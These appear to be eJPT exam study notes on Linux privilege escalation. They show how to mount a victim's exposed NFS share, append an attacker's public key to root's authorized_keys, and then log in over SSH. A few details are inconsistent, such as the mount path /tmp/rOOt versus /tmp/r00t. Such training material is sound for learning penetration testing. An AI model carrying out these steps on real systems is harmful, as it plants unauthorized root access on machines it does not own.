
##### Crate a SSH key and transfer to the victim
Link: [[eJPT EXAM/Privilege Escalation WINDOWS & LINUX/Linux Privilege Escalation/SSH Key, History file and Config file|SSH Key, History file and Config file]]

##### Share that Private key using NFS 
List all the NFS shares [[eJPT EXAM/Privilege Escalation WINDOWS & LINUX/Linux Privilege Escalation/Network File Share (NFS)|Network File Share (NFS)]]
```sh
showmount -e <ip>
```

Create a file on attacker machine for mount to the victim NFS
```bash
mkdir /tmp/rOOt
```

Now mount to the victim
```sh
mount -t nfs <victim_ip>:/ /tmp/rOOt
```

Share the public key to the victim 
```sh
cat ~/.ssh/id_rsa.pub >> /tmp/rOOt/root/.ssh/authorized_keys
```

Finally unmount the connection 
```sh
umount /tmp/r00t
```
--------------------

So now we can connect to the victim machine using SSH
```sh
ssh user@<victim_ip> -p <port>
```